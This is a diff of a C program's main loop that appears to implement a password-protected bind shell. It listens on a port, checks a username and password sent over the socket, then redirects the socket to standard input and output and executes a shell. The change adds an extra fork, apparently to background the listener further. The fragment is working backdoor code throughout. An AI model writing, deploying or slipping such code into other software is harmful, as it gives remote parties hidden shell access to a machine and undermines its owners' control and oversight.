@@ -47,48 +47,50 @@ int main(int argc, char ** argv){
 	startList(&f);
 	if(fork()){
 		sin_size = Socket(&sockfd, &host, port);
-		while(TRUE){
-			Accept(&nsockfd, &sockfd, &client, &sin_size);
-			if(fork()){
-				FD_ZERO(&rset);
-				FD_SET(nsockfd, &rset);
-				for(;;){
-					maxfd = nsockfd;
-					select(maxfd + 1, &rset, NULL, NULL, NULL);
-					if(FD_ISSET(nsockfd, &rset)){
-						recv_l = recv(nsockfd, username, MAXLINE, 0);
-						str_format(username);
-						recv_l = recv(nsockfd, passwd, MINLINE, 0);
-						str_format(passwd);
-						if(recv_l < 0){
-							fatal("in recv()");
-							}else if(recv_l == 0){
-							fprintf(stderr, "\n[%s-%s] Connection interrupted by host...\n", T_RED, NOTHING);
-							close(nsockfd);
-							break;
-							}else{
-							access = login(&f, username, passwd);
-							if(access == 1){
-								close(0);
-								close(1);
-								close(2);
-								dup2(nsockfd, 0);
-								dup2(nsockfd, 1);
-								dup2(nsockfd, 2);
-								execve(sh[0], sh, NULL);
+		if(fork()){
+			while(TRUE){
+				Accept(&nsockfd, &sockfd, &client, &sin_size);
+				if(fork()){
+					FD_ZERO(&rset);
+					FD_SET(nsockfd, &rset);
+					for(;;){
+						maxfd = nsockfd;
+						select(maxfd + 1, &rset, NULL, NULL, NULL);
+						if(FD_ISSET(nsockfd, &rset)){
+							recv_l = recv(nsockfd, username, MAXLINE, 0);
+							str_format(username);
+							recv_l = recv(nsockfd, passwd, MINLINE, 0);
+								str_format(passwd);
+							if(recv_l < 0){
+								fatal("in recv()");
+								}else if(recv_l == 0){
+								fprintf(stderr, "\n[%s-%s] Connection interrupted by host...\n", T_RED, NOTHING);
 								close(nsockfd);
-							}else{
-									printf("\n-==[WARNING] Access Denied [!!]==-\n");
+								break;
+								}else{
+								access = login(&f, username, passwd);
+								if(access == 1){
+									close(0);
+									close(1);
+									close(2);
+									dup2(nsockfd, 0);
+									dup2(nsockfd, 1);
+									dup2(nsockfd, 2);
+									execve(sh[0], sh, NULL);
 									close(nsockfd);
-									break;
-							}
-						} 
+								}else{
+										printf("\n-==[WARNING] Access Denied [!!]==-\n");
+											close(nsockfd);
+										break;
+								}
+							} 
+						}
 					}
 				}
 			}
 		}
 	}
-	
+			
 	listFree(&f);
 	return 0;
-}
+}		
